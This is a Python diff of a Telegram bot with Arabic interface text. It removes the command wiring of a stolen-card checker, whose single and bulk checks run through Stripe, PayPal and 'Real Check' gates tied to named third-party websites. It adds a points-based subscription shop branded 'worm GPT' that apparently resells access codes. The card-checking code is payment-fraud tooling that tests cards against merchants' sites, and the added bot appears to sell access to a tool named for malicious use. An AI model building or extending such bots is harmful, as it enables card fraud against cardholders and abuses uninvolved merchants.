+                       for i in SUBSCRIPTION_TYPES.values()])
+    await update.message.reply_text(
+        f"🤖 *worm GPT 👹*\n\nبوت إدارة اشتراكات احترافي\n\n"
+        f"📦 *الباقات:*\n{types}\n\n🌐 {SITE_URL}",
+        parse_mode="Markdown",
+        reply_markup=kb_main(is_admin(update.effective_user.id)),
+        disable_web_page_preview=True)
+
+# ═══════════════════════════════════════════════════════════════════
+# 💰 المكافأة + الدعوة + المعرف
+# ═══════════════════════════════════════════════════════════════════
+
+async def do_daily(update, context):
+    ok, msg = await db.claim_daily_bonus(update.effective_user.id)
+    await update.message.reply_text(msg, reply_markup=kb_main(is_admin(update.effective_user.id)))
+
+async def show_invite(update, context):
+    u = await db.get_user(update.effective_user.id)
+    link = f"https://t.me/{context.bot.username}?start=ref_{u['user_id']}"
+    await update.message.reply_text(
+        f"🔗 *رابط دعوتك:*\n`{link}`\n\n💰 {POINTS_INVITE} نقطة لكل صديق!",
+        parse_mode="Markdown", reply_markup=kb_main(is_admin(update.effective_user.id)))
+
+async def show_my_id(update, context):
+    u = await db.get_user(update.effective_user.id)
+    await update.message.reply_text(
+        f"🆔 *معرفك:*\n`{u['user_id']}`\n\nأعطه لمن يريد تحويل نقاط لك.",
+        parse_mode="Markdown", reply_markup=kb_main(is_admin(update.effective_user.id)))
+
+# ═══════════════════════════════════════════════════════════════════
+# 💸 التحويل
+# ═══════════════════════════════════════════════════════════════════
+
+async def transfer_begin(update, context):
+    user = await db.get_user(update.effective_user.id)
+    context.user_data["state"] = "transfer_id"
+    context.user_data.pop("transfer_to", None)
+    context.user_data.pop("transfer_amount", None)
+    await update.message.reply_text(
+        f"💸 *تحويل نقاط*\n\n💎 رصيدك: `{user['points']}`\n\n"
+        f"أرسل *معرف (ID)* المستخدم:\n_(من @userinfobot)_\n\n❌ للإلغاء",
+        parse_mode="Markdown", reply_markup=kb_cancel())
+
+async def transfer_get_id(update, context, text):
     try:
-        PORT = int(os.environ.get('PORT', 10000))
-        
-        class BotHandler(http.server.SimpleHTTPRequestHandler):
-            def do_GET(self):
-                self.send_response(200)
-                self.send_header('Content-type', 'text/plain')
-                self.end_headers()
-                self.wfile.write(b'OK - Obeida Online Bot is running')
-            
-            def do_HEAD(self):
-                self.send_response(200)
-                self.end_headers()
-            
-            def log_message(self, format, *args):
-                pass
-        
-        server = socketserver.TCPServer(("0.0.0.0", PORT), BotHandler)
-        print(f"✅ Web server started on port {PORT}")
-        server.serve_forever()
-        
-    except Exception as e:
-        print(f"⚠️ Web server error: {e}")
+        target_id = int(text)
+    except ValueError:
+        await update.message.reply_text("❌ معرف غير صالح. أرسل رقماً:", reply_markup=kb_cancel())
+        return
+    if target_id == update.effective_user.id:
+        await update.message.reply_text("❌ لا يمكن التحويل لنفسك:", reply_markup=kb_cancel())
+        return
+    target = await db.get_user(target_id)
+    if not target:
+        await update.message.reply_text("❌ غير مسجل. أرسل معرفاً آخر:", reply_markup=kb_cancel())
+        return
+    context.user_data["transfer_to"] = target_id
+    context.user_data["state"] = "transfer_amount"
+    name = target.get("first_name") or target.get("username") or str(target_id)
+    await update.message.reply_text(f"👤 *{name}*\n\n💎 أرسل عدد النقاط:",
+                                      parse_mode="Markdown", reply_markup=kb_cancel())
 
-# ==================== إعداد البوت ====================
-def setup():
-    DataManager.init_files()
-    handler = CommandHandler()
-    callback = CallbackHandler(handler)
-    
-    # تشغيل خادم الويب
-    web_thread = threading.Thread(target=run_web_server, daemon=True)
-    web_thread.start()
-    
-    @bot.message_handler(commands=['start'])
-    def start(m): handler.handle_start(m)
-    
-    @bot.message_handler(commands=['stop'])
-    def stop(m): handler.handle_stop(m)
-    
-    @bot.message_handler(commands=['profile'])
-    def profile(m): handler.handle_profile(m)
-    
-    @bot.message_handler(commands=['stats'])
-    def stats(m): handler.handle_stats(m)
-    
-    @bot.message_handler(commands=['default'])
-    def default(m): handler.handle_default_gate(m)
-    
-    @bot.message_handler(commands=['lastfile'])
-    def lastfile(m): handler.check_last_file(m)
-    
-    @bot.message_handler(commands=['st'])
-    def stripe(m): handler.handle_single(m, 'stripe')
-    
-    @bot.message_handler(commands=['mass'])
-    def stripe_mass(m): handler.handle_mass(m, 'stripe')
-    
-    @bot.message_handler(commands=['chk'])
-    def real(m): handler.handle_single(m, 'real')
-    
-    @bot.message_handler(commands=['chkm'])
-    def real_mass(m): handler.handle_mass(m, 'real')
-    
-    @bot.message_handler(commands=['pp'])
-    def paypal(m): handler.handle_single(m, 'paypal')
-    
-    @bot.message_handler(commands=['ppm'])
-    def paypal_mass(m): handler.handle_mass(m, 'paypal')
-    
-    @bot.message_handler(content_types=['document'])
-    def doc(m): handler.handle_file_upload(m)
-    
-    @bot.message_handler(func=lambda m: True)
-    def text(m):
-        text = m.text.strip()
-        if f"@{BOT_USERNAME}" in text:
-            text = text.replace(f"@{BOT_USERNAME}", "").strip()
-        cards = Helpers.extract_cards_from_text(text)
-        if cards:
-            if len(cards) == 1:
-                handler.check_single_card(m, cards[0], DataManager.get_user_default_gate(m.from_user.id))
+async def transfer_get_amount(update, context, text):
+    try:
+        amount = int(text)
+        if amount < MIN_TRANSFER:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text(f"❌ الحد الأدنى {MIN_TRANSFER}. أرسل رقماً:",
+                                          reply_markup=kb_cancel()); return
+    user = await db.get_user(update.effective_user.id)
+    if user["points"] < amount:
+        await update.message.reply_text(f"🔒 رصيدك `{user['points']}`. أرسل أقل:",
+                                          parse_mode="Markdown", reply_markup=kb_cancel()); return
+    context.user_data["transfer_amount"] = amount
+    context.user_data["state"] = "transfer_confirm"
+    target_id = context.user_data.get("transfer_to")
+    target = await db.get_user(target_id)
+    name = target.get("first_name") or target.get("username") or str(target_id)
+    await update.message.reply_text(
+        f"📋 *تأكيد:*\n\n👤 *{name}*\n💎 `{amount}`\n\nأرسل `تأكيد` للمتابعة:",
+        parse_mode="Markdown", reply_markup=kb_cancel())
+
+async def transfer_do_confirm(update, context, text):
+    if text.strip().lower() not in ("تأكيد", "confirm", "نعم"):
+        await update.message.reply_text("❌ أرسل `تأكيد` أو ❌ إلغاء:",
+                                          parse_mode="Markdown", reply_markup=kb_cancel()); return
+    target_id = context.user_data.get("transfer_to")
+    amount = context.user_data.get("transfer_amount")
+    if not target_id or not amount:
+        await show_home(update, context); return
+    ok, msg = await db.transfer_points(update.effective_user.id, target_id, amount)
+    if ok:
+        target = await db.get_user(target_id)
+        name = target.get("first_name") or target.get("username") or str(target_id)
+        await update.message.reply_text(
+            f"✅ *تم التحويل!*\n\n👤 *{name}*\n💎 `{amount}`",
+            parse_mode="Markdown", reply_markup=kb_main(is_admin(update.effective_user.id)))
+        try:
+            await context.bot.send_message(target_id,
+                f"🎁 *وصلك تحويل!*\n\nمن: {update.effective_user.first_name}\n💎 `{amount}`",
+                parse_mode="Markdown")
+        except Exception:
+            pass
+    else:
+        await update.message.reply_text(f"❌ {msg}",
+                                          reply_markup=kb_main(is_admin(update.effective_user.id)))
+    context.user_data["state"] = "main"
+    context.user_data.pop("transfer_to", None)
+    context.user_data.pop("transfer_amount", None)
+
+# ═══════════════════════════════════════════════════════════════════
+# 🛒 الشراء — 3 خطط بدون fallback
+# ═══════════════════════════════════════════════════════════════════
+
+async def buy_choose_type(update, context, sub_type):
+    info = SUBSCRIPTION_TYPES[sub_type]
+    user = await db.get_user(update.effective_user.id)
+    context.user_data["buy"] = {"type": sub_type}
+    context.user_data["state"] = "buy_days"
+    prices_text = "\n".join([f"  • {d} يوم = {p} 💎" for d, p in info["prices"].items()])
+    await update.message.reply_text(
+        f"{info['emoji']} *{info['name']}*\n\n{info['description']}\n\n"
+        f"💰 *الأسعار:*\n{prices_text}\n\n"
+        f"💎 رصيدك: `{user['points']}`\n\n📅 اختر المدة:",
+        parse_mode="Markdown", reply_markup=kb_days(sub_type))
+
+async def buy_choose_days(update, context, days):
+    ctx = context.user_data.get("buy", {})
+    sub_type = ctx.get("type")
+    if not sub_type:
+        await show_shop(update, context); return
+    info = SUBSCRIPTION_TYPES[sub_type]
+    if days not in info["prices"]:
+        await update.message.reply_text("❌ مدة غير صحيحة", reply_markup=kb_days(sub_type))
+        return
+    ctx["days"] = days
+    ctx["unit_price"] = info["prices"][days]
+    user = await db.get_user(update.effective_user.id)
+    context.user_data["state"] = "buy_qty"
+    await update.message.reply_text(
+        f"{info['emoji']} *{info['name']}* — {days} يوم\n\n"
+        f"💰 سعر الوحدة: `{info['prices'][days]}`\n"
+        f"💎 رصيدك: `{user['points']}`\n\n"
+        f"🔢 اختر عدد الأكواد:\n_(خصم تلقائي للكميات)_",
+        parse_mode="Markdown", reply_markup=kb_quantity())
+
+async def buy_choose_qty(update, context, qty):
+    ctx = context.user_data.get("buy", {})
+    sub_type = ctx.get("type")
+    days = ctx.get("days")
+    if not sub_type or not days:
+        await show_shop(update, context); return
+
+    info = SUBSCRIPTION_TYPES[sub_type]
+    unit_price = info["prices"][days]
+    total, subtotal, discount = calculate_price(unit_price, qty)
+    user = await db.get_user(update.effective_user.id)
+
+    if user["points"] < total:
+        await update.message.reply_text(
+            f"🔒 *نقاطك غير كافية*\n\nالمطلوب: `{total}` 💎\nلديك: `{user['points']}` 💎\n"
+            f"ينقصك: `{total - user['points']}` 💎",
+            parse_mode="Markdown", reply_markup=kb_quantity())
+        return
+
+    ctx["quantity"] = qty
+    ctx["subtotal"] = subtotal
+    ctx["discount"] = discount
+    ctx["total"] = total
+    context.user_data["state"] = "buy_confirm"
+
+    discount_line = f"\n🎁 خصم: `{discount}%` (`-{subtotal - total}` 💎)" if discount > 0 else ""
+    await update.message.reply_text(
+        f"📋 *ملخص الطلب*\n\n"
+        f"{info['emoji']} *{info['name']}*\n📅 {days} يوم\n🔢 {qty} كود\n\n"
+        f"─────────────────\n"
+        f"سعر الوحدة: `{unit_price}` 💎\n"
+        f"المجموع: `{subtotal}` 💎{discount_line}\n"
+        f"─────────────────\n"
+        f"✅ *الإجمالي: `{total}` 💎*\n"
+        f"💎 رصيدك: `{user['points']}`\n💵 المتبقي: `{user['points'] - total}`",
+        parse_mode="Markdown", reply_markup=kb_confirm())
+
+async def buy_confirm(update, context):
+    """تأكيد الطلب — بدون fallback، رسالة واضحة عند فشل premium"""
+    user_id = update.effective_user.id
+    admin = is_admin(user_id)
+
+    try:
+        ctx = context.user_data.get("buy", {})
+        sub_type = ctx.get("type")
+        days = ctx.get("days")
+        quantity = ctx.get("quantity")
+        total = ctx.get("total")
+
+        logger.info(f"[BUY] user={user_id} type={sub_type} days={days} qty={quantity} total={total}")
+
+        if not all([sub_type, days, quantity, total]):
+            await update.message.reply_text("❌ بيانات الطلب ناقصة. ابدأ من جديد.",
+                                              reply_markup=kb_shop())
+            context.user_data["state"] = "shop"
+            return
+
+        user = await db.get_user(user_id)
+        if not user:
+            await update.message.reply_text("❌ المستخدم غير موجود.", reply_markup=kb_main(admin))
+            return
+
+        if user["points"] < total:
+            await update.message.reply_text(
+                f"🔒 نقاطك غير كافية\n\nالمطلوب: {total}\nلديك: {user['points']}",
+                reply_markup=kb_main(admin))
+            return
+
+        info = SUBSCRIPTION_TYPES[sub_type]
+        api_plan = info["api_plan"]
+
+        # 1️⃣ إشعار فوري
+        await update.message.reply_text(
+            f"⏳ *جاري إنشاء {quantity} كود...*\n\n"
+            f"📦 {info['name']} — {days} يوم\n"
+            f"🔑 نوع API: `{api_plan}`\n\n"
+            f"⏱️ قد يستغرق {quantity * 3} ثانية تقريباً.\n"
+            f"لا تغلق المحادثة.",
+            parse_mode="Markdown", reply_markup=kb_main(admin))
+
+        # 2️⃣ الإنشاء
+        codes = []
+        failed = 0
+        first_error = ""
+
+        for i in range(quantity):
+            try:
+                logger.info(f"[BUY] محاولة {i+1}/{quantity}: api.create(plan={api_plan}, days={days})")
+                result = await api.create(api_plan, days, 1)
+
+                if result.get("ok"):
+                    code = extract_code(result.get("data", {}))
+                    if code:
+                        codes.append(code)
+                        logger.info(f"[BUY] ✅ كود #{i+1}: {code}")
+                        try:
+                            await db.save_subscription(user_id, {
+                                "code": code, "plan": sub_type, "actual_plan": api_plan,
+                                "days": days, "max_uses": 1, "points_spent": 0,
+                                "response": result.get("data", {})
+                            })
+                        except Exception as e:
+                            logger.error(f"[BUY] فشل حفظ DB: {e}")
+                    else:
+                        failed += 1
+                        if not first_error:
+                            first_error = f"لا كود في الاستجابة: {str(result.get('data'))[:150]}"
+                        logger.error(f"[BUY] {first_error}")
+                else:
+                    failed += 1
+                    if not first_error:
+                        first_error = result.get("message", "خطأ غير معروف")
+                    logger.error(f"[BUY] ❌ كود #{i+1}: {first_error}")
+
+            except Exception as e:
+                failed += 1
+                if not first_error:
+                    first_error = str(e)
+                logger.exception(f"[BUY] استثناء كود #{i+1}: {e}")
+
+        logger.info(f"[BUY] انتهى: نجح={len(codes)}, فشل={failed}")
+
+        # 3️⃣ كل الأكواد فشلت — رسالة حسب النوع
+        if not codes:
+            logger.error(f"[BUY] فشل كامل: {first_error}")
+
+            if sub_type == "premium":
+                await update.message.reply_text(
+                    f"❌ *عذراً، اشتراك بريميوم غير متوفر حالياً*\n\n"
+                    f"🔍 *السبب:* `{first_error[:200]}`\n\n"
+                    f"💡 *الخطتان المتاحتان الآن:*\n\n"
+                    f"⭐ *بلس* — اشتراك أساسي\n"
+                    f"   💎 30 يوم = 15 نقطة\n\n"
+                    f"💎 *برو* — اشتراك متقدم\n"
+                    f"   💎 30 يوم = 25 نقطة\n\n"
+                    f"استخدم الأزرار بالأسفل للعودة.",
+                    parse_mode="Markdown",
+                    reply_markup=kb_main(admin))
             else:
-                handler.check_multiple_cards(m, cards, DataManager.get_user_default_gate(m.from_user.id))
-        else:
-            if Helpers.get_chat_type(m.chat.id) == "private":
-                bot.reply_to(m, "⚠️ أرسل البطاقة: <code>4111111111111111|12|25|123</code>\n\nالبوابات المتاحة:\n/st - Stripe Auth (UwU)\n/chk - Real Check\n/pp - PayPal", parse_mode='HTML', reply_markup=UserInterface.main_buttons())
-    
-    @bot.callback_query_handler(func=lambda c: True)
-    def cb(c): callback.handle(c)
-    
-    print(Fore.GREEN + "✅ البوت جاهز!" + Style.RESET_ALL)
-    print(Fore.CYAN + "📌 البوابات المتاحة:" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💳 Stripe Auth (UwU) - /st و /mass (copenhagensilver.com)" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   ✅ Real Check - /chk و /chkm (cloud.vast.ai)" + Style.RESET_ALL)
-    print(Fore.YELLOW + "   💰 PayPal - /pp و /ppm (awwatersheds.org)" + Style.RESET_ALL)
-    
-    bot.infinity_polling()
+                await update.message.reply_text(
+                    f"❌ *فشل إنشاء الأكواد*\n\n"
+                    f"📦 النوع: {info['name']}\n"
+                    f"🔍 *السبب:* `{first_error[:200]}`\n\n"
+                    f"💡 أبلغ المشرف.",
+                    parse_mode="Markdown",
+                    reply_markup=kb_main(admin))
+
+            context.user_data.pop("buy", None)
+            context.user_data["state"] = "main"
+            return
+
+        # 4️⃣ خصم النقاط
+        unit_price = info["prices"][days]
+        actual_total, _, _ = calculate_price(unit_price, len(codes))
+        logger.info(f"[BUY] خصم {actual_total} (نجح {len(codes)})")
+
+        if not await db.deduct_points(user_id, actual_total):
+            logger.error(f"[BUY] فشل الخصم")
+            await update.message.reply_text(
+                "⚠️ *فشل خصم النقاط*\n\nأبلغ المشرف.",
+                parse_mode="Markdown", reply_markup=kb_main(admin))
+            return
+
+        # 5️⃣ عرض النتيجة
+        codes_text = "\n".join([f"`{c}`" for c in codes])
+        warning = f"\n\n⚠️ فشل {failed} كود — لم تُخصم قيمتها." if failed > 0 else ""
+
+        try:
+            await update.message.reply_text(
+                f"✅ *تم إنشاء {len(codes)} كود!*\n\n"
+                f"{info['emoji']} {info['name']} — {days} يوم\n"
+                f"💎 خُصم: `{actual_total}` نقطة\n\n"
+                f"🔑 *أكوادك:*\n{codes_text}"
+                f"{warning}\n\n"
+                f"📖 فعّلها في: {SITE_URL}",
+                parse_mode="Markdown",
+                reply_markup=kb_main(admin),
+                disable_web_page_preview=True)
+            logger.info(f"[BUY] ✅ تم العرض بنجاح")
+        except Exception as e:
+            logger.exception(f"[BUY] فشل عرض النتيجة: {e}")
+            await update.message.reply_text(
+                f"✅ نجح {len(codes)} كود:\n\n{codes_text}",
+                reply_markup=kb_main(admin))
+
+        context.user_data.pop("buy", None)
+        context.user_data["state"] = "main"
+
+    except Exception as e:
+        logger.exception(f"[BUY] خطأ فادح: {e}")
+        try:
+            await update.message.reply_text(
+                f"❌ *خطأ غير متوقع*\n\n`{str(e)[:200]}`\n\nأبلغ المشرف.",
+                parse_mode="Markdown", reply_markup=kb_main(admin))
+        except Exception:
+            pass
+        context.user_data.pop("buy", None)
+        context.user_data["state"] = "main"
+
+# ═══════════════════════════════════════════════════════════════════
+# 🛡️ لوحة المشرف
+# ═══════════════════════════════════════════════════════════════════
+
+async def show_admin(update, context):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("🚫 للمشرفين فقط", reply_markup=kb_main(False)); return
+    context.user_data["state"] = "admin"
+    await update.message.reply_text("🛡️ *لوحة المشرف*", parse_mode="Markdown",
+                                      reply_markup=kb_admin())
+
+async def show_keys(update, context):
+    if not is_admin(update.effective_user.id): return
+    keys = await db.list_api_keys()
+    active = next((k for k in keys if k["is_active"]), None)
+    lines = ["🔑 *المفاتيح*\n"]
+    if not keys:
+        lines.append("لا توجد مفاتيح.")
+    else:
+        lines.append(f"🟢 النشط: `{active['label'] if active else '—'}`\n📊 المجموع: {len(keys)}\n")
+        for k in keys[:10]:
+            s = "🟢" if k["is_active"] else "⚪"
+            lines.append(f"{s} #{k['id']} {k.get('label') or '—'} (✅{k['success_count']} ❌{k['fail_count']})")
+    context.user_data["state"] = "keys"
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown",
+                                      reply_markup=kb_keys())
+
+async def key_add_begin(update, context):
+    context.user_data["state"] = "key_add_value"
+    await update.message.reply_text("🔐 أرسل قيمة المفتاح:", reply_markup=kb_cancel())
+
+async def key_add_value(update, context, text):
+    if len(text) < 5:
+        await update.message.reply_text("❌ قصير:", reply_markup=kb_cancel()); return
+    context.user_data["new_key_value"] = text
+    context.user_data["state"] = "key_add_label"
+    await update.message.reply_text("✏️ اسم وصفي:", reply_markup=kb_cancel())
+
+async def key_add_label(update, context, text):
+    label = text[:50]
+    value = context.user_data.pop("new_key_value", None)
+    if not value:
+        await show_admin(update, context); return
+    await db.add_api_key(value, label, update.effective_user.id)
+    ok, msg = await api.test_key(value)
+    await update.message.reply_text(f"✅ حُفظ `{label}`\n{msg}",
+                                      parse_mode="Markdown", reply_markup=kb_keys())
+    context.user_data["state"] = "keys"
+
+async def show_drops(update, context):
+    if not is_admin(update.effective_user.id): return
+    context.user_data["state"] = "drops"
+    await update.message.reply_text(
+        "🎁 *دروب الاشتراكات*\n\nأنشئ رابطاً يفتح لأول شخص فقط.",
+        parse_mode="Markdown", reply_markup=kb_drops())
+
+async def show_pdrops(update, context):
+    if not is_admin(update.effective_user.id): return
+    context.user_data["state"] = "pdrops"
+    await update.message.reply_text(
+        "💎 *دروب النقاط*\n\nأنشئ رابطاً يفتح لأول شخص فقط.",
+        parse_mode="Markdown", reply_markup=kb_pdrops())
+
+async def drop_create_begin(update, context):
+    context.user_data["state"] = "drop_type"
+    rows = [[KeyboardButton(f"drop:{k}") for k in SUBSCRIPTION_TYPES.keys()]]
+    rows.append([KeyboardButton(BTN_CANCEL)])
+    await update.message.reply_text("🎁 اختر النوع:",
+                                      reply_markup=ReplyKeyboardMarkup(rows, resize_keyboard=True))
+
+async def drop_choose_type(update, context, text):
+    sub_type = text.replace("drop:", "")
+    if sub_type not in SUBSCRIPTION_TYPES: return
+    context.user_data["drop_plan"] = sub_type
+    context.user_data["state"] = "drop_days"
+    info = SUBSCRIPTION_TYPES[sub_type]
+    days = list(info["prices"].keys())
+    rows = []
+    if len(days) >= 2: rows.append([KeyboardButton(f"{d} يوم") for d in days[:2]])
+    if len(days) > 2: rows.append([KeyboardButton(f"{d} يوم") for d in days[2:]])
+    rows.append([KeyboardButton(BTN_CANCEL)])
+    await update.message.reply_text(f"{info['emoji']} {info['name']}\n\nاختر المدة:",
+                                      reply_markup=ReplyKeyboardMarkup(rows, resize_keyboard=True))
+
+async def drop_choose_days(update, context, text):
+    try:
+        days = int(text.replace("يوم", "").replace("أيام", "").strip())
+    except ValueError:
+        return
+    plan = context.user_data.pop("drop_plan", None)
+    if not plan:
+        await show_admin(update, context); return
+    token = await db.create_drop(plan, days, update.effective_user.id)
+    link = f"https://t.me/{context.bot.username}?start=drop_{token}"
+    info = SUBSCRIPTION_TYPES[plan]
+    await update.message.reply_text(
+        f"✅ *أُنشئ!*\n\n{info['emoji']} {info['name']} — {days}ي\n\n"
+        f"🔗 `{link}`\n\n📢 أول شخص يفوز!",
+        parse_mode="Markdown", reply_markup=kb_drops())
+    context.user_data["state"] = "drops"
+
+async def pdrop_create_begin(update, context):
+    context.user_data["state"] = "pdrop_points"
+    await update.message.reply_text("💎 أرسل عدد النقاط:", reply_markup=kb_cancel())
+
+async def pdrop_receive(update, context, text):
+    try:
+        points = int(text)
+        if points < 1:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ رقم صحيح ≥ 1:", reply_markup=kb_cancel()); return
+    token = await db.create_points_drop(points, update.effective_user.id)
+    link = f"https://t.me/{context.bot.username}?start=pdrop_{token}"
+    await update.message.reply_text(
+        f"✅ *أُنشئ!*\n\n💰 {points} نقطة\n\n🔗 `{link}`\n\n📢 أول شخص يفوز!",
+        parse_mode="Markdown", reply_markup=kb_pdrops())
+    context.user_data["state"] = "pdrops"
+
+async def show_stats(update, context):
+    if not is_admin(update.effective_user.id): return
+    users = await db.count_users()
+    subs = await db.count_subscriptions()
+    keys = await db.list_api_keys()
+    txt = f"📊 *إحصائيات*\n\n👥 `{users}`\n📦 `{subs}`\n🔑 `{len(keys)}`"
+    await update.message.reply_text(txt, parse_mode="Markdown", reply_markup=kb_admin())
+
+async def show_logs(update, context):
+    if not is_admin(update.effective_user.id): return
+    logs = await db.recent_logs(15)
+    lines = ["📜 *السجل:*\n"]
+    for l in logs:
+        lines.append(f"`{l['created_at'][11:19]}` {l['action']}")
+    await update.message.reply_text("\n".join(lines) or "لا سجلات",
+                                      parse_mode="Markdown", reply_markup=kb_admin())
+
+# ═══════════════════════════════════════════════════════════════════
+# 🎯 الراوتر الرئيسي
+# ═══════════════════════════════════════════════════════════════════
+
+async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message or not update.message.text:
+        return
+    text = update.message.text.strip()
+    user_id = update.effective_user.id
+    admin = is_admin(user_id)
+    state = context.user_data.get("state", "main")
+
+    logger.info(f"[TEXT] user={user_id} state={state} text={text[:40]}")
+
+    try:
+        # حالات المحادثات النصية
+        if state == "transfer_id":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "main"
+                await show_home(update, context); return
+            await transfer_get_id(update, context, text); return
+
+        if state == "transfer_amount":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "main"
+                await show_home(update, context); return
+            await transfer_get_amount(update, context, text); return
+
+        if state == "transfer_confirm":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "main"
+                await show_home(update, context); return
+            await transfer_do_confirm(update, context, text); return
+
+        if state == "key_add_value":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "admin"
+                await show_admin(update, context); return
+            await key_add_value(update, context, text); return
+
+        if state == "key_add_label":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "admin"
+                await show_admin(update, context); return
+            await key_add_label(update, context, text); return
+
+        if state == "drop_type":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "admin"
+                await show_admin(update, context); return
+            if text.startswith("drop:"):
+                await drop_choose_type(update, context, text); return
+            return
+
+        if state == "drop_days":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "admin"
+                await show_admin(update, context); return
+            await drop_choose_days(update, context, text); return
+
+        if state == "pdrop_points":
+            if text == BTN_CANCEL:
+                context.user_data["state"] = "admin"
+                await show_admin(update, context); return
+            await pdrop_receive(update, context, text); return
+
+        # الأزرار الرئيسية
+        if text == BTN_HOME:    await show_home(update, context); return
+        if text == BTN_SHOP:    await show_shop(update, context); return
+        if text == BTN_SUBS:    await show_subs(update, context); return
+        if text == BTN_WALLET:  await show_wallet(update, context); return
+        if text == BTN_EARN:    await show_earn(update, context); return
+        if text == BTN_TOP:     await show_top(update, context); return
+        if text == BTN_GUIDE:   await show_guide(update, context); return
+        if text == BTN_ABOUT:   await show_about(update, context); return
+        if text == BTN_ADMIN:   await show_admin(update, context); return
+
+        # الرجوع
+        if text == BTN_BACK:
+            if state in ("shop", "buy_days", "buy_qty", "buy_confirm"):
+                await show_shop(update, context)
+            elif state == "wallet":
+                await show_wallet(update, context)
+            elif state == "earn":
+                await show_earn(update, context)
+            elif state in ("admin", "keys", "drops", "pdrops"):
+                await show_admin(update, context)
+            else:
+                await show_home(update, context)
+            return
+
+        # شراء: النوع
+        if state in ("shop", "buy_days"):
+            if text == BTN_PLUS:    await buy_choose_type(update, context, "plus"); return
+            if text == BTN_PRO:     await buy_choose_type(update, context, "pro"); return
+            if text == BTN_PREMIUM: await buy_choose_type(update, context, "premium"); return
+
+        # شراء: المدة
+        if state == "buy_days":
+            try:
+                days = int(text.replace("يوم", "").replace("أيام", "").strip())
+                await buy_choose_days(update, context, days); return
+            except ValueError:
+                pass
+
+        # شراء: العدد
+        if state == "buy_qty":
+            if text == BTN_QTY_1:    await buy_choose_qty(update, context, 1); return
+            if text == BTN_QTY_2:    await buy_choose_qty(update, context, 2); return
+            if text == BTN_QTY_3:    await buy_choose_qty(update, context, 3); return
+            if text == BTN_QTY_5:    await buy_choose_qty(update, context, 5); return
+            if text == BTN_QTY_10:   await buy_choose_qty(update, context, 10); return
+            if text == BTN_QTY_CUSTOM:
+                context.user_data["state"] = "buy_custom_qty"
+                await update.message.reply_text("✏️ أرسل عدد الأكواد (1-100):",
+                                                  reply_markup=kb_cancel()); return
+
+        # شراء: عدد مخصص
+        if state == "buy_custom_qty":
+            if text == BTN_CANCEL:
+                ctx = context.user_data.get("buy", {})
+                sub_type = ctx.get("type")
+                if sub_type:
+                    context.user_data["state"] = "buy_qty"
+                    await update.message.reply_text("🔢 اختر عدداً:", reply_markup=kb_quantity())
+                else:
+                    await show_shop(update, context)
+                return
+            try:
+                qty = int(text)
+                if qty < 1 or qty > 100:
+                    raise ValueError
+            except ValueError:
+                await update.message.reply_text("❌ رقم بين 1 و 100:", reply_markup=kb_cancel())
+                return
+            await buy_choose_qty(update, context, qty); return
+
+        # شراء: التأكيد
+        if state == "buy_confirm":
+            if text == BTN_CONFIRM:
+                await buy_confirm(update, context); return
+            if text == BTN_EDIT_QTY:
+                ctx = context.user_data.get("buy", {})
+                sub_type = ctx.get("type")
+                if sub_type:
+                    context.user_data["state"] = "buy_qty"
+                    await update.message.reply_text("🔢 اختر عدداً جديداً:", reply_markup=kb_quantity())
+                return
+            if text == BTN_CANCEL:
+                await show_home(update, context); return
+
+        # محفظة / اكسب
+        if state in ("wallet", "earn"):
+            if text == BTN_DAILY:    await do_daily(update, context); return
+            if text == BTN_INVITE:   await show_invite(update, context); return
+            if text == BTN_MY_ID:    await show_my_id(update, context); return
+            if text == BTN_TRANSFER: await transfer_begin(update, context); return
+
+        # إدارة
+        if state == "admin" and admin:
+            if text == BTN_KEYS:    await show_keys(update, context); return
+            if text == BTN_DROPS:   await show_drops(update, context); return
+            if text == BTN_PDROPS:  await show_pdrops(update, context); return
+            if text == BTN_STATS:   await show_stats(update, context); return
+            if text == BTN_LOGS:    await show_logs(update, context); return
+
+        if state == "keys" and admin:
+            if text == BTN_ADD_KEY:
+                await key_add_begin(update, context); return
+
+        if state == "drops" and admin:
+            if text == BTN_CREATE_DROP:
+                await drop_create_begin(update, context); return
+
+        if state == "pdrops" and admin:
+            if text == BTN_CREATE_PDROP:
+                await pdrop_create_begin(update, context); return
+
+        # افتراضي
+        await update.message.reply_text("🤔 استخدم الأزرار بالأسفل.", reply_markup=kb_main(admin))
+
+    except Exception as e:
+        logger.exception(f"[TEXT] خطأ: {e}")
+        try:
+            await update.message.reply_text(
+                f"❌ خطأ: `{str(e)[:150]}`",
+                parse_mode="Markdown", reply_markup=kb_main(admin))
+        except Exception:
+            pass
+
+# ═══════════════════════════════════════════════════════════════════
+# 🛡️ أوامر
+# ═══════════════════════════════════════════════════════════════════
+
+async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await show_admin(update, context)
+
+async def ban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id): return
+    if not context.args:
+        await update.message.reply_text("`/ban <id>`", parse_mode="Markdown"); return
+    try: uid = int(context.args[0])
+    except: return
+    await db.set_ban(uid, 1)
+    await update.message.reply_text(f"✅ حُظر {uid}")
+
+async def unban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id): return
+    if not context.args: return
+    try: uid = int(context.args[0])
+    except: return
+    await db.set_ban(uid, 0)
+    await update.message.reply_text(f"✅ رُفع الحظر")
+
+async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["state"] = "main"
+    for k in ("buy", "transfer_to", "transfer_amount", "new_key_value", "drop_plan"):
+        context.user_data.pop(k, None)
+    await show_home(update, context)
+
+# ═══════════════════════════════════════════════════════════════════
+# 🎬 التشغيل
+# ═══════════════════════════════════════════════════════════════════
+
+async def post_init(app):
+    await db.init()
+    keys = await db.list_api_keys()
+    if not keys and INITIAL_API_KEY:
